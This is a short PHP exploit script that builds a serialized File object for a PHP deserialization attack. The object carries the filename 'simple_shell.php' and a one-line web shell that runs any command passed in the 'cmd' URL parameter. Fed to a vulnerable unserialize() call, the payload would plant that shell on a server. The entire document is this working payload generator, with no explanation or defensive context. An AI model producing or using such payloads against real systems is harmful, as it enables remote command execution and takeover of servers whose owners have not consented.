<?php
require __DIR__ . '/file.php';
$o = new File();
$o->filename = "simple_shell.php";
$o->content = '<?php echo system($_GET[\'cmd\']); ?>';
echo serialize($o);
?>
